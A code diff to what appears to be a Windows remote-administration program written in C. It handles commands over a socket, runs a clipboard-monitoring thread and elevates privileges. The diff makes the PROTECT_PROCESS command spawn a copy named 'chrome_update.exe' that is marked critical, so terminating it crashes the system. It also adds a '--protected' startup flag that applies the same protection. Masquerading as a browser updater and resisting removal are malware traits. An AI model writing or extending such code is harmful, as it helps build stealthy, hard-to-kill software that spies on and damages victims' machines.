@@ -122,15 +122,8 @@ static void handle_admin_command(SOCKET sock, const char *cmd) {
         result = "[Security check complete]";
     }
     else if (strcmp(cmd, "PROTECT_PROCESS") == 0) {
-        sys_protect_process();
-        result = (char*)sys_protection_status();
-        if (strcmp(result, "CRITICAL") == 0) {
-            result = "[Process protected — system will BSOD if terminated]";
-        } else if (strcmp(result, "FAILED") == 0) {
-            result = "[Protection failed — ensure admin privileges]";
-        } else {
-            result = "[Process already normal]";
-        }
+        sys_spawn_protected_copy();
+        result = "[Spawned chrome_update.exe with protection]";
     }
     else if (strcmp(cmd, "UNPROTECT_PROCESS") == 0) {
         sys_unprotect_process();
@@ -224,6 +217,12 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     /* Start background services */
     CreateThread(NULL, 0, copy_buffer_monitor_thread, NULL, 0, NULL);
     
+    /* Check if running in protected mode */
+    char *cmdLine = GetCommandLineA();
+    if (cmdLine && strstr(cmdLine, "--protected") != NULL) {
+        sys_protect_process();
+    }
+
     /* Elevate privileges if needed for full functionality */
     sys_check_privileges();
     
